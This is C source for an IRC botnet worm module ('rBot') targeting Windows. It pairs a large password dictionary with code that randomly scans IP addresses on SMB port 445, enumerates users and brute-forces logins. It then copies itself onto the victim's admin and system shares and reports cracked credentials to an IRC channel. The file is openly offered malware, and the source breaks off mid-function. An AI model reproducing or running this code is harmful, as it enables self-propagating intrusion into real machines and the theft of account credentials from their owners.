/* 

rBot - A bot to rule them All 


*/


#include <windows.h>
#include <stdio.h>
#include <Winnetwk.h>

#include <lm.h>
#include <lmat.h>


int NetConnect(char *szUserName, char *szPassWord, char *szIP);
DWORD WINAPI PortScanner(LPVOID parm);
int RootBox(char *szIP);
void enumusers(char *szServer);

const char *szLocalPayloadFile="moo.dat";

char *passes[]={
"",
"!@#$",
"!@#$%",
"!@#$%^",
"!@#$%^&",
"!@#$%^&*",
"%",
"0",
"00",
"000",
"0000",
"00000",
"000000",
"00000000",
"007",
"0wn3d",
"0wned",
"1",
"110",
"111",
"111",
"111111",
"11111111",
"11111111",
"12",
"121",
"121212",
"123",
"123123",
"1234",
"12345",
"123456",
"1234567",
"12345678",
"123456789",
"12346",
"123467",
"1234678",
"12346789",
"123467890",
"1234qwer",
"123abc",
"123asd",
"123qwe",
"2002",
"2003",
"2600",
"54321",
"54321",
"54321",
"654321",
"654321",
"88888888",
"88888888",
"a",
"aaa",
"abc",
"abc123",
"abcd",
"academia",
"academic",
"accept",
"ACCESS",
"access",
"account",
"accounting",
"accounts",
"action",
"ada",
"adam",
"adm",
"admin",
"ADMIN",
"Admin",
"admin123",
"Administrador",
"Administrateur",
"administrator",
"ADMINISTRATOR",
"Administrator",
"adrian",
"adrianna",
"adult",
"aerobics",
"afro",
"aids",
"airplane",
"Al3x",
"alaska",
"albany",
"albatros",
"albatross",
"albert",
"alert",
"alex",
"Alex",
"alexande",
"Alexander",
"alf",
"algebra",
"alias",
"aliases",
"alice",
"alicia",
"alisa",
"alison",
"allison",
"allow",
"alpha",
"alphabet",
"ama",
"amadeus",
"amanda",
"amber",
"america",
"amorphou",
"amorphous",
"amy",
"anal",
"analog",
"anarchis",
"anarchy",
"anchor",
"andrea",
"android",
"andromac",
"andromache",
"andy",
"anfo",
"angela",
"angerine",
"angie",
"animal",
"animals",
"anita",
"ann",
"anna",
"anne",
"annette",
"anon",
"anonymou",
"answer",
"anthrax",
"anthropo",
"anthropogenic",
"anvils",
"anything",
"apollo13",
"april",
"aria",
"ariadne",
"arlene",
"army",
"arrow",
"arthur",
"artist",
"asd",
"asdf",
"asdfgh",
"asian",
"asm",
"asshole",
"athena",
"atmosphe",
"atmosphere",
"atom",
"attack",
"authoriz",
"aztecs",
"azure",
"babe",
"baby",
"bacchus",
"backdoor",
"BACKUP",
"backup",
"badass",
"bailey",
"ball",
"banana",
"bananas",
"bandit",
"bank",
"banks",
"barbara",
"barber",
"bare",
"barf",
"baritone",
"bart",
"bartman",
"baseball",
"basic",
"bass",
"bassoon",
"batch",
"batman",
"beach",
"beammeup",
"bear",
"beast",
"beater",
"beauty",
"beaver",
"becky",
"beethove",
"beethoven",
"begin",
"behead",
"bell",
"beloved",
"benz",
"beowulf",
"berkeley",
"berlin",
"berliner",
"beryl",
"beta",
"beth",
"betsie",
"betty",
"beverly",
"bible",
"bicamera",
"bicameral",
"bigfoot",
"bill",
"billy",
"binary",
"bios",
"bird",
"bishop",
"bitch",
"bitmap",
"bitnet",
"bla",
"black",
"blank",
"blonde",
"blondie",
"blood",
"bloodaxe",
"blow",
"blowjob",
"blue",
"blues",
"board",
"bob",
"bomb",
"boner",
"boob",
"boobs",
"book",
"born",
"BOTH",
"boyscout",
"bradley",
"brandi",
"brandy",
"bravo",
"break",
"breast",
"brenda",
"brian",
"bridget",
"broadway",
"brothel",
"bruce",
"brunette",
"brute",
"brutefor",
"bsd",
"bulls",
"bullshit",
"bumbling",
"bung",
"burgess",
"burn",
"butch",
"butt",
"butthead",
"cad",
"californ",
"camille",
"campanil",
"campanile",
"camping",
"candi",
"candy",
"cantor",
"capitol",
"captain",
"capture",
"card",
"cardinal",
"caren",
"carla",
"carmen",
"carol",
"carole",
"carolina",
"caroline",
"carrie",
"carson",
"cascades",
"cash",
"castle",
"cat",
"catherin",
"catherine",
"catholic",
"cathy",
"cave",
"cayuga",
"cecily",
"celt",
"celtic",
"celtics",
"cerulean",
"change",
"changeme",
"Changeme",
"charity",
"charles",
"charlie",
"charming",
"charon",
"chat",
"CHECK",
"chem",
"chemistr",
"chemistry",
"chess",
"chester",
"chip",
"chris",
"christin",
"christina",
"christine",
"christy",
"CHT",
"cigar",
"cigarett",
"cindy",
"cisco",
"class",
"classes",
"classic",
"claudia",
"claymore",
"cleavage",
"clinton",
"cluster",
"clusters",
"coast",
"cocacola",
"cocainco",
"cock",
"code",
"codename",
"codeword",
"coffee",
"coin",
"coke",
"cola",
"cold",
"collins",
"color",
"combat",
"comics",
"commit",
"commrade",
"commrades",
"company",
"compaq",
"computer",
"computin",
"comrade",
"comrades",
"condo",
"condom",
"connect",
"connie",
"conserva",
"console",
"continue",
"control",
"cook",
"cookbook",
"cookie",
"cool",
"cooper",
"copper",
"cops",
"copy",
"corneliu",
"cornelius",
"correct",
"counters",
"country",
"couscous",
"cowboy",
"crack",
"crackpot",
"crash",
"cream",
"create",
"creation",
"creature",
"credit",
"creosote",
"cretin",
"crime",
"criminal",
"cristina",
"crystal",
"cshrc",
"ctx",
"cunt",
"customer",
"cyber",
"cyberpun",
"cyberspa",
"cynthia",
"d00d",
"daemon",
"daisy",
"dana",
"dancer",
"daniel",
"danielle",
"danny",
"dapper",
"dark",
"darkaven",
"data",
"database",
"databasepass",
"databasepassword",
"dave",
"dawn",
"db1",
"db1234",
"dbpass",
"dbpassword",
"dead",
"death",
"deathsta",
"deb",
"debbie",
"deborah",
"debug",
"december",
"deck",
"default",
"DEFAULT",
"Default",
"defoe",
"dell",
"Dell",
"delta",
"deluge",
"DEMO",
"demo",
"democrat",
"denise",
"dennis",
"desiree",
"desk",
"desktop",
"desperat",
"desperate",
"develop",
"device",
"devil",
"dial",
"diamond",
"diana",
"diane",
"dice",
"dick",
"diehard",
"diet",
"dieter",
"digital",
"dinosaur",
"dipshit",
"direct",
"director",
"dirty",
"disc",
"discipli",
"disclose",
"discover",
"discovery",
"disk",
"diskette",
"disney",
"display",
"doctor",
"dog",
"dollar",
"domain",
"domainpass",
"domainpassword",
"donaldduck",
"dong",
"doom",
"doom2",
"doomii",
"doomsday",
"doonesbu",
"door",
"doors",
"dope",
"dos",
"download",
"dragon",
"drdoom",
"drive",
"drought",
"duck",
"dud3",
"dude",
"dudette",
"duelist",
"duke",
"dulce",
"duncan",
"dungeon",
"dyke",
"eager",
"eagle",
"earth",
"easier",
"easy",
"eatme",
"echo",
"eddie",
"edges",
"edinburg",
"edinburgh",
"edit",
"edition",
"edu",
"educatio",
"education",
"edwin",
"edwina",
"egghead",
"eiderdow",
"eiderdown",
"eileen",
"einsiein",
"einstein",
"elaine",
"elanor",
"electron",
"elephant",
"elizabet",
"elizabeth",
"ellen",
"email",
"emerald",
"emily",
"emmanuel",
"enable",
"enemy",
"engine",
"engineer",
"england",
"english",
"enter",
"enterpri",
"enterprise",
"enzyme",
"erenity",
"eric",
"erica",
"erika",
"erin",
"erotic",
"ersatz",
"establis",
"establish",
"estate",
"eternity",
"euclid",
"evelyn",
"exchange",
"exchnge",
"expert",
"explode",
"explore",
"explorer",
"explosiv",
"extensio",
"extension",
"fairway",
"faith",
"falcon",
"false",
"family",
"farad",
"faraday",
"fart",
"fast",
"fear",
"feds",
"felicia",
"fender",
"fermat",
"ferrari",
"fidelity",
"field",
"fight",
"file",
"FILES",
"finite",
"fire",
"firewall",
"fish",
"fishers",
"flakes",
"float",
"florida",
"flower",
"flowers",
"foobar",
"food",
"fool",
"foolproo",
"foolproof",
"football",
"force",
"ford",
"foresigh",
"foresight",
"forever",
"form",
"format",
"fornicat",
"forsythe",
"fourier",
"foxtrot",
"france",
"frank",
"freak",
"fred",
"freddy",
"free",
"freedom",
"french",
"friday",
"friend",
"friends",
"frighten",
"frog",
"fryguy",
"fubar",
"fuck",
"fucked",
"fucker",
"fucking",
"fuckme",
"fuckyou",
"fudge",
"FULL",
"fun",
"function",
"fungible",
"gabriel",
"games",
"gardner",
"garfield",
"Gast",
"gateway",
"gatherin",
"gatt",
"gauss",
"george",
"germ",
"gertrude",
"ghost",
"gibson",
"gigabyte",
"gina",
"ginger",
"girl",
"glacier",
"glen",
"gnu",
"gobo",
"god",
"godblessyou",
"gold",
"golden",
"golf",
"golfer",
"good",
"gorgeous",
"gorges",
"gosling",
"gouge",
"govermen",
"grades",
"graham",
"grahm",
"grand",
"grant",
"great",
"green",
"group",
"gryphon",
"guardian",
"gucci",
"guess",
"guessme",
"guest",
"GUEST",
"Guest",
"guitar",
"gumption",
"guntis",
"h4x0r1ng",
"h4x0ring",
"h4x1ng",
"hack",
"hacked",
"hacker",
"hagar",
"hair",
"hal",
"hallowee",
"hamlet",
"hamster",
"handel",
"handily",
"handjob",
"happenin",
"happening",
"hard",
"hardcore",
"harddriv",
"harmony",
"harold",
"harvey",
"hate",
"haven",
"hawaii",
"hax",
"hax0r",
"haxing",
"head",
"headbang",
"headoffice",
"heat",
"heathen",
"heather",
"heaven",
"hebrides",
"heidi",
"heinlein",
"hell",
"hello",
"help",
"herb",
"herbert",
"hero",
"heroin",
"hewlett",
"hexadeci",
"hiawatha",
"hibernia",
"hidden",
"high",
"highland",
"hitler",
"hits",
"ho",
"hole",
"holly",
"hollywoo",
"home",
"homepage",
"homer",
"homeuser",
"homework",
"honey",
"hooker",
"hooters",
"horny",
"horrible",
"horror",
"horse",
"horus",
"host",
"hotdog",
"hotel",
"hq",
"http",
"hunt",
"hunter",
"hutchins",
"hydrogen",
"hyper",
"hypertxt",
"ian",
"ibm",
"icecream",
"ihavenopass",
"illumina",
"image",
"imbrogli",
"imbroglio",
"immortal",
"imperial",
"include",
"india",
"indian",
"indiana",
"indians",
"ingres",
"ingress",
"ingrid",
"inna",
"innocuou",
"innocuous",
"input",
"inside",
"integer",
"Internet",
"internet",
"intranet",
"invent",
"Inviter",
"irene",
"irishman",
"irule",
"isis",
"jackie",
"jail",
"jane",
"janet",
"janice",
"janie",
"japan",
"jasmin",
"java",
"jazz",
"jean",
"jeanne",
"jeff",
"jen",
"jenni",
"jennifer",
"jenny",
"jerry",
"jerusale",
"jessica",
"jester",
"jewelry",
"jill",
"jixian",
"joan",
"joanne",
"jody",
"joe",
"john",
"johndoe",
"johnny",
"joseph",
"joshua",
"journal",
"joy",
"joyce",
"judith",
"judy",
"juggle",
"juicy",
"julia",
"julie",
"juliet",
"june",
"jupiter",
"kaka",
"karen",
"karie",
"karina",
"katana",
"kate",
"kathleen",
"kathrine",
"kathy",
"katie",
"katina",
"katrina",
"kelly",
"keri",
"kermit",
"kernel",
"kerri",
"kerrie",
"kerry",
"kevin",
"kewl",
"key",
"keybord",
"keyin",
"keyword",
"kiddie",
"kids",
"kill",
"killer",
"killthem",
"kilo",
"kim",
"kimberly",
"king",
"kirk",
"kirkland",
"kiss",
"kissmyas",
"kitten",
"klingon",
"knife",
"knight",
"knightma",
"known",
"krista",
"kristen",
"kristi",
"kristie",
"kristin",
"kristine",
"kristy",
"l337",
"l33t",
"ladies",
"ladle",
"lakers",
"lambda",
"laminati",
"lamination",
"lan",
"lana",
"laptop",
"lara",
"larkin",
"larry",
"laser",
"laura",
"lava",
"lazarus",
"lazer",
"leah",
"lebesgue",
"lee",
"leet",
"left",
"leftwing",
"legal",
"leland",
"leroy",
"lesbian",
"leslie",
"letmein",
"lewis",
"lexluthe",
"liberal",
"library",
"lick",
"licker",
"life",
"light",
"lightsab",
"lima",
"limbaugh",
"limited",
"linda",
"link",
"linux",
"lion",
"lips",
"lisa",
"lisp",
"literatu",
"live",
"liz",
"load",
"LOCAL",
"lock",
"lockout",
"lockword",
"logic",
"login",
"Login",
"loginpass",
"loginwor",
"logout",
"lois",
"lol",
"lolopc",
"loose",
"lore",
"lori",
"lorin",
"lorraine",
"loser",
"louis",
"love",
"lovebug",
"lover",
"luck",
"lucus",
"lucy",
"lude",
"luke",
"lust",
"lynn",
"lynne",
"M$",
"machine",
"macintos",
"macintosh",
"mack",
"macro",
"maggot",
"magic",
"magnet",
"mail",
"main",
"maint",
"malcolm",
"malcom",
"mana",
"manager",
"mara",
"marci",
"marcy",
"maria",
"mariens",
"marietta",
"marijuan",
"marines",
"mark",
"markus",
"marni",
"marriage",
"mars",
"marty",
"marvin",
"mary",
"mason",
"mass",
"master",
"Mat",
"math",
"Matt",
"Matthew",
"maurice",
"meagan",
"megabyte",
"megadeth",
"megan",
"melissa",
"mellon",
"melrose",
"member",
"memory",
"menace",
"menu",
"mercury",
"merlin",
"metal",
"metalhea",
"metalica",
"mets",
"mgr",
"mice",
"michael",
"michel",
"michelan",
"michele",
"michelle",
"mickey",
"micro",
"microchi",
"micropro",
"microsof",
"midieval",
"mike",
"mine",
"minimum",
"minsky",
"mirc",
"misfit",
"mission",
"mit",
"mkii",
"mode",
"modem",
"mogul",
"moguls",
"monday",
"monica",
"moom",
"moor",
"moose",
"more",
"morley",
"morris",
"mortal",
"mortalco",
"mortgage",
"mosaic",
"mountain",
"mouse",
"move",
"movie",
"movies",
"mozart",
"MP",
"mpeg",
"MS",
"msdos",
"muppets",
"mutant",
"mypass",
"mypass123",
"mypc",
"mypc123",
"nagel",
"name",
"nancy",
"napoleon",
"nasa",
"navy",
"ND",
"neil",
"nepenthe",
"neptune",
"ness",
"net",
"net-devil",
"netbios",
"netdevil",
"netfuck",
"netscape",
"network",
"new",
"newborn",
"news",
"newsgrou",
"newton",
"newyork",
"next",
"nice",
"nicole",
"nicotine",
"night",
"nightmar",
"Nilez",
"nintendo",
"nita",
"nnaacp",
"noble",
"nobody",
"node",
"nokia",
"none",
"noob",
"noreen",
"notes",
"noth",
"nova",
"novel",
"november",
"noxious",
"nuclear",
"nude",
"nuke",
"nukem",
"null",
"number",
"nutritio",
"nutrition",
"nuts",
"nyquist",
"obscurit",
"oceanogr",
"oceanography",
"ocelot",
"oem",
"OEM",
"oeminstall",
"oemuser",
"office",
"okay",
"oldage",
"olivetti",
"olivia",
"omega",
"open",
"opening",
"openlock",
"opensesa",
"operator",
"oracle",
"orange",
"orca",
"orient",
"orwell",
"oscar",
"osiris",
"outdoors",
"outlaw",
"outlook",
"output",
"outside",
"owa",
"own",
"owned",
"owner",
"OWNER",
"Owner",
"oxford",
"pacific",
"packard",
"packer",
"pad",
"painless",
"paint",
"pakistan",
"pam",
"pamela",
"papa",
"paper",
"papers",
"pascal",
"pass",
"pass123",
"pass1234",
"passphra",
"passwd",
"password",
"PASSWORD",
"Password",
"password1",
"password123",
"paste",
"pat",
"patricia",
"patrick",
"patriot",
"patty",
"paula",
"pc",
"peanuts",
"pecker",
"pencil",
"penelope",
"penguin",
"Penis",
"penis",
"penname",
"pentagon",
"pentagra",
"penthous",
"pentium",
"peoria",
"pepper",
"pepsi",
"percolat",
"percolate",
"perfect",
"permit",
"persimmo",
"persimmon",
"persona",
"pervert",
"pete",
"peter",
"phil",
"philip",
"phoenix",
"phone",
"photon",
"phrack",
"phrase",
"phreak",
"phuck",
"pick",
"pierre",
"pimp",
"pink",
"pinname",
"piss",
"pizza",
"plane",
"playboy",
"plover",
"pluto",
"plymouth",
"poetry",
"police",
"polly",
"polynomi",
"polynomial",
"ponderin",
"pondering",
"poop",
"poor",
"pork",
"porn",
"porno",
"porsche",
"post",
"poster",
"power",
"praise",
"precious",
"prelude",
"presto",
"prince",
"princeto",
"princeton",
"printer",
"priv",
"private",
"privs",
"proceed",
"processo",
"professo",
"professor",
"profile",
"program",
"prompt",
"protect",
"protozoa",
"psycho",
"psychopa",
"pub",
"public",
"puck",
"puke",
"pumpkin",
"puneet",
"punisher",
"punk",
"puppet",
"pussy",
"pw",
"pw123",
"pwd",
"qaz",
"quebec",
"qwe",
"qwer",
"qwert",
"qwerty",
"r00t",
"rabbit",
"rachel",
"rachelle",
"rachmani",
"rachmaninoff",
"RAGE",
"raid",
"rain",
"rainbow",
"raindrop",
"raleigh",
"random",
"rape",
"rascal",
"razor",
"READ",
"reagan",
"reality",
"really",
"ream",
"reaper",
"rebal",
"rebecca",
"rebel",
"record",
"reddawn",
"redhead",
"referenc",
"regional",
"release",
"remote",
"renee",
"reno",
"rent",
"report",
"republic",
"resistan",
"reveal",
"rhino",
"rich",
"rick",
"riffraff",
"right",
"rightwin",
"ring",
"riot",
"ripple",
"risc",
"rje",
"roach",
"robert",
"robin",
"robot",
"robotics",
"robyn",
"rochelle",
"rocheste",
"rochester",
"rock",
"rocky",
"rockyhor",
"rodent",
"rolex",
"romano",
"romeo",
"romulan",
"ron",
"ronald",
"root",
"ROOT",
"rooted",
"Rosco",
"RoscoP",
"RoscoPColtrane",
"rose",
"rosebud",
"rosemary",
"roses",
"Ross",
"rough",
"RPC",
"rubber",
"ruben",
"ruby",
"rude",
"rules",
"running",
"rush",
"ruth",
"sa",
"safe",
"sage",
"sal",
"salami",
"sale",
"salt",
"sam",
"samantha",
"sample",
"sandra",
"sandy",
"sara",
"sarah",
"satan",
"satanic",
"satanik",
"saturday",
"saturn",
"saxon",
"scamper",
"scheme",
"school",
"schoolsucks",
"scifi",
"scorpion",
"scott",
"scotty",
"scout",
"script",
"scriptkiddie",
"search",
"secret",
"security",
"seed",
"sega",
"sensor",
"sentinel",
"sentry",
"serenity",
"serial",
"server",
"SERVER",
"service",
"sesame",
"sex",
"sexy",
"shannon",
"sharc",
"SHARE",
"shark",
"sharks",
"sharon",
"sheffiel",
"sheffield",
"sheldon",
"shell",
"sherri",
"shift",
"shirley",
"shit",
"shitpot",
"shiva",
"shivers",
"short",
"shuttle",
"sick",
"siemens",
"sierra",
"signatur",
"signature",
"silver",
"simcity",
"simon",
"simple",
"simpsons",
"simulati",
"singer",
"single",
"site",
"skull",
"slave",
"slick",
"sliders",
"slow",
"slut",
"small",
"smart",
"smile",
"smiles",
"smooch",
"smother",
"smtp",
"smut",
"snach",
"snafu",
"snake",
"snatch",
"snoopy",
"soap",
"social",
"socrates",
"sodomy",
"soft",
"software",
"somebody",
"sondra",
"sonia",
"sonic",
"sonya",
"sossina",
"source",
"south",
"spaceman",
"spaceshi",
"sparrows",
"spear",
"spell",
"spencer",
"spice",
"spider",
"spiderma",
"spit",
"spred",
"spring",
"springer",
"spunk",
"sql",
"sqlagent",
"sqlpass",
"squires",
"sr71",
"stacey",
"staci",
"stacie",
"stacy",
"staff",
"Standard",
"star",
"starship",
"start",
"startrek",
"startup",
"starwars",
"steak",
"steal",
"steel",
"steph",
"stephani",
"stephanie",
"stereo",
"steve",
"stoneage",
"stoned",
"stones",
"strange",
"strangle",
"stratfor",
"stratford",
"streetfi",
"string",
"strip",
"student",
"student1",
"stuttgar",
"stuttgart",
"subscrib",
"subway",
"success",
"suck",
"suckmydi",
"sucks",
"sue",
"summer",
"sun",
"sunday",
"super",
"superman",
"superson",
"supersta",
"superstage",
"superuse",
"superuser",
"supervis",
"support",
"supporte",
"supported",
"surfer",
"surfing",
"susan",
"susanne",
"susie",
"suzanne",
"suzie",
"swearer",
"sweat",
"switch",
"sword",
"sybase",
"sybil",
"symmetry",
"sys",
"sysadmin",
"sysop",
"system",
"SYSTEM",
"tabasco",
"talk",
"tall",
"tamara",
"tami",
"tamie",
"tammy",
"tangerin",
"tangerine",
"tango",
"tape",
"tara",
"target",
"tarragon",
"taylor",
"teacher",
"team",
"teapot",
"tears",
"tech",
"technical",
"teen",
"teenage",
"telephon",
"telephone",
"telnet",
"TEMP",
"temp",
"temp123",
"temptati",
"temptation",
"tennis",
"tera",
"terminal",
"terminat",
"tess",
"TEST",
"test",
"Test",
"test123",
"tester",
"testin",
"testing",
"tetris",
"text",
"thailand",
"theresa",
"thin",
"thursday",
"tiffany",
"tiger",
"time",
"tina",
"tits",
"toad",
"toggle",
"token",
"tokenrin",
"tomato",
"topograp",
"topography",
"tortoise",
"toxic",
"toyota",
"traci",
"tracie",
"tracy",
"trails",
"transfer",
"trap",
"trapdoor",
"tree",
"trek",
"trisha",
"trivial",
"trojan",
"trombone",
"tron",
"true",
"truth",
"tty",
"tubas",
"tuesday",
"turn",
"turnip",
"tuttle",
"ugly",
"umesh",
"uncle",
"undo",
"unhappy",
"unicorn",
"uniform",
"universa",
"universe",
"universi",
"unix",
"unknown",
"Unknown",
"unlock",
"upload",
"uranus",
"urchin",
"ursula",
"usenet",
"user",
"USER",
"User",
"user1",
"usermane",
"username",
"userpassword",
"usmc",
"util",
"utility",
"uucp",
"uwontguessme",
"vagina",
"valerie",
"vampire",
"vasant",
"venus",
"veronica",
"vertigo",
"vicky",
"victor",
"video",
"videogam",
"village",
"virgin",
"virginia",
"virus",
"visitor",
"visual",
"visualba",
"vodka",
"w00t",
"waco",
"ward",
"warez",
"warfare",
"wargames",
"warp",
"warren",
"wasp",
"watchwor",
"water",
"wave",
"web",
"webpage",
"wednesda",
"weed",
"weenie",
"well",
"wendi",
"wendy",
"werewolf",
"west",
"western",
"wh0r3",
"wh0re",
"whatever",
"whatnot",
"whisky",
"white",
"whiting",
"whitney",
"wholesal",
"wholesale",
"whore",
"wileecoyote",
"will",
"william",
"williams",
"williamsburg",
"willie",
"wilma",
"win",
"win2000",
"win2k",
"win98",
"windose",
"windows",
"windows2k",
"windows95",
"windows98",
"windowsME",
"WindowsXP",
"windowz",
"windoze",
"windoze2k",
"windoze95",
"windoze98",
"windozeME",
"windozexp",
"wine",
"wing",
"winnt",
"winpass",
"winston",
"winxp",
"wired",
"wisconsi",
"wisconsin",
"wiseass",
"within",
"wizard",
"wolf",
"wolverin",
"woman",
"wombat",
"women",
"wood",
"woodwind",
"word",
"wordperf",
"worf",
"work",
"worm",
"wormwood",
"WRITE",
"wwii",
"www",
"wwwadmin",
"wyoming",
"x",
"xena",
"xfer",
"xman",
"xmen",
"xmodem",
"xp",
"xray",
"xx",
"xxx",
"xxxx",
"xxxxx",
"xxxxxx",
"xxxxxxx",
"xxxxxxxx",
"xxxxxxxxx",
"xyz",
"xyzzy",
"yaco",
"yang",
"yankee",
"yellow",
"yellowst",
"yellowstone",
"yolanda",
"yosemite",
"young",
"youwontguessme",
"yxcv",
"zap",
"zebra",
"zeitgeis",
"ziggy",
"zimmerma",
"zimmerman",
"zmodem",
"zombie",
"zulu",
"zxc",
"zxcv",
"fuckyou",
"fuckme",
"fucker",
"passwd",
"hack",
"hacker",
"hackerx",
"pussy",
"vagina",
"penis",
"dick",
"marijuana",
"weed",
"bong",
    NULL
};

char scanip[20];
SOCKET sock2;

// For dynamically loaded... (won't give error on win9x).
typedef NET_API_STATUS (__stdcall *NSJA)(LPWSTR,LPBYTE,LPDWORD);
NSJA fNetScheduleJobAdd;

typedef NET_API_STATUS (__stdcall *NABF)(LPVOID);
NABF fNetApiBufferFree;

typedef NET_API_STATUS (__stdcall *NRTOD)(LPCWSTR,LPBYTE *);
NRTOD fNetRemoteTOD;

typedef NET_API_STATUS (__stdcall *NUE)(LPWSTR,DWORD,DWORD,LPBYTE *,DWORD,LPDWORD,LPDWORD,LPDWORD);
NUE fNetUserEnum;


struct NTSCAN {
	DWORD threads;
	DWORD minutes;
	DWORD threadid;
	char ipmask[20];
	SOCKET sock1;
};

BOOL ntscan=FALSE;


DWORD WINAPI ntpass_main(void *pnts)
{
	int i;
	HINSTANCE hLib;
	FILE *fp;
	NTSCAN *nts=(NTSCAN *)pnts;
	char szSelfExe[MAX_PATH];

	fp=fopen(szLocalPayloadFile,"r");
	if (fp!=NULL) {
		fclose(fp);
	} else {
		GetModuleFileName(0,szSelfExe,MAX_PATH);
		CopyFile(szSelfExe,szLocalPayloadFile,FALSE);
	}
	hLib=LoadLibrary("netapi32.dll");
	if (!hLib) return 0;
	fNetScheduleJobAdd=(NSJA)GetProcAddress(hLib,"NetScheduleJobAdd");
	fNetApiBufferFree=(NABF)GetProcAddress(hLib,"NetApiBufferFree");
	fNetRemoteTOD=(NRTOD)GetProcAddress(hLib,"NetRemoteTOD");
	fNetUserEnum=(NUE)GetProcAddress(hLib,"NetUserEnum");

	if ((!fNetScheduleJobAdd) || (!fNetApiBufferFree) || (!fNetRemoteTOD) || (!fNetUserEnum)) {
		//We couldn't load the addresses of each function...
		//(Win95/98??)
		FreeLibrary(hLib);
		return 0;
	}



	strcpy(scanip,nts->ipmask);
	srand(GetTickCount());
	ntscan=TRUE;
	sock2=nts->sock1;
	for (i=0;i<(nts->threads);i++)
	{
		CreateThread(0,0,&PortScanner,0,0,0);
		Sleep(20);
	}

	Sleep(60000*nts->minutes);
	ntscan=FALSE;
	threads[nts->threadid]=0;

	return 0;
}


unsigned long GetNextIP(char *scanmask)
{
	int ip1,ip2,ip3,ip4;
	if (strlen(scanmask)>15) return 0;
	ip1=-1;ip2=-1;ip3=-1;ip4=-1;
	sscanf(scanmask,"%d.%d.%d.%d",&ip1,&ip2,&ip3,&ip4);
	if (ip1==-1) ip1=rand();
	if (ip2==-1) ip2=rand();
	if (ip3==-1) ip3=rand();
	if (ip4==-1) ip4=rand();
	return (ip1+(ip2<<8)+(ip3<<16)+(ip4<<24));
}


BOOL port_open(unsigned long ip)
{
	SOCKET s;
	SOCKADDR_IN sin;
	unsigned long blockcmd=1;
	timeval t;
	int i;
	FD_SET rset;
	s=socket(AF_INET,SOCK_STREAM,0);
	if (s==INVALID_SOCKET) return INVALID_SOCKET;
	sin.sin_family=AF_INET;
	sin.sin_addr.S_un.S_addr=ip;
	sin.sin_port=htons(445);
	ioctlsocket(s,FIONBIO,&blockcmd);
	connect(s,(LPSOCKADDR)&sin,sizeof(sin));
	FD_ZERO(&rset);
	FD_SET(s,&rset);
	t.tv_sec=5;
	t.tv_usec=0;
	i=select(0,0,&rset,0,&t);
	closesocket(s);
	if (i<=0) {
		return FALSE;
	} else {
		return TRUE;
	}
}

DWORD WINAPI PortScanner(LPVOID parm)
{
	BOOL p_open;
	DWORD dwIP;
	IN_ADDR in;
	char szIP[18];
				
			
		srand(GetTickCount());
	while (ntscan)
	{

		dwIP=GetNextIP(scanip);
		p_open=port_open(dwIP);


		if (p_open==TRUE) {
			in.s_addr=dwIP;

			sprintf(szIP,"\\\\%s",inet_ntoa(in));
			enumusers(szIP);
		}
	}
	return 0;
}



BOOL rootBox(char *szUserName, char *szIP)
{
	int i;
	i=0;
	char tmp[100];
	while (passes[i])
	{
		if (NetConnect(szUserName,passes[i],szIP)==TRUE) {
		sprintf(tmp,"Exploiting: %s with %s / %s\r\n",szIP,szUserName,passes[i]); 
		 irc_sendf2(sock2, "PRIVMSG %s :%s",channel,tmp); // change this to your channel
		 return TRUE;
		}
		i++;
	}
	return FALSE;
}

BOOL NetConnect(char *szUserName, char *szPassWord, char *szIP)
{
	DWORD dwResult; 
	NETRESOURCE nr;
	memset(&nr,0,sizeof(NETRESOURCE));
	nr.lpRemoteName=szIP;
	nr.dwType=RESOURCETYPE_DISK;
	nr.lpLocalName=NULL;
	nr.lpProvider=NULL;
	//
	// Call the WNetAddConnection2 function to make the connection,
	//   specifying a persistent connection.
	//
	dwResult = WNetAddConnection2(&nr, // NETRESOURCE from enumeration 
		(LPSTR) szPassWord,                  // no password 
		(LPSTR) szUserName,                  // logged-in user 
0);       // update profile with connect information 

	

	if(dwResult != NO_ERROR) 
	{ 
		WNetCancelConnection2(szIP,CONNECT_UPDATE_PROFILE,TRUE);
		return FALSE; 
	}
 


	WCHAR wszNetbios[200];
	char szRemoteFile[MAX_PATH],szRemoteFile2[MAX_PATH],szRemoteFile3[MAX_PATH],szRemoteFile4[MAX_PATH],szRemoteFile5[MAX_PATH],szRemoteFile6[MAX_PATH],szRemoteFile7[MAX_PATH],szRemoteFile8[MAX_PATH];
	TIME_OF_DAY_INFO *tinfo=NULL;
	NET_API_STATUS nStatus;
	DWORD JobID;
	AT_INFO at_time;


	sprintf(szRemoteFile,"%s\\Admin$\\system32\\%s",szIP,filename);
	sprintf(szRemoteFile2,"%s\\C$\\winnt\\system32\\%s",szIP,filename);
	sprintf(szRemoteFile3,"%s\\C$\\windows\\system32\\%s",szIP,filename);
	sprintf(szRemoteFile4,"%s\\Admin$\\%s",szIP,filename);
    sprintf(szRemoteFile5,"%s\\print$\\%s",szIP,filename); 
    sprintf(szRemoteFile6,"%s\\lwc$\\%s",szIP,filename);
    sprintf(szRemoteFile7,"%s\\netlogon$\\%s",szIP,filename);
    sprintf(szRemoteFile8,"%s\\sysvol$\\%s",szIP,filename);


	//No fucking errormessages. Only on success and what the success was
	
	MultiByteToWideChar(CP_ACP,0,szIP,-1,wszNetbios,sizeof(wszNetbios));
	nStatus=fNetRemoteTOD(wszNetbios,(LPBYTE *)&tinfo);
	if (nStatus==NERR_Success) {
		if (tinfo) {
			int i;

			i=CopyFile(szLocalPayloadFile,szRemoteFile,FALSE);
			if (!i) {
	
				i=CopyFile(szLocalPayloadFile,szRemoteFile2,FALSE);
				if (!i) {
	
					i=CopyFile(szLocalPayloadFile,szRemoteFile3,FALSE);
					if (!i) {
						
						i=CopyFile(szLocalPayloadFile,szRemoteFile4,FALSE);
						if (!i) {
						    
    						i=CopyFile(szLocalPayloadFile,szRemoteFile5,FALSE);
    						if (!i) {
						    
	    				          	i=CopyFile(szLocalPayloadFile,szRemoteFile6,FALSE);
	    				          	if (!i) {
						    
                   	    				i=CopyFile(szLocalPayloadFile,szRemoteFile7,FALSE);
                   	    				if (!i) {
						    
 	    			                       	i=CopyFile(szLocalPayloadFile,szRemoteFile8,FALSE);
 	    			                       	if (!i) {

								fNetApiBufferFree(tinfo);
								WNetCancelConnection2(szIP,CONNECT_UPDATE_PROFILE,TRUE);
								return TRUE;
															}
														else irc_sendf2(sock2, "PRIVMSG %s :[NTScan - Exploited %s] CSendFile: %s\r\n",channel,szIP);
					
													}
												else irc_sendf2(sock2, "PRIVMSG %s :[NTScan - Exploited %s] CSendFile: %s\r\n",channel,szIP);
										} 
										else irc_sendf2(sock2, "PRIVMSG %s :[NTScan - Exploited %s] CSendFile: %s\r\n",channel,szIP); 
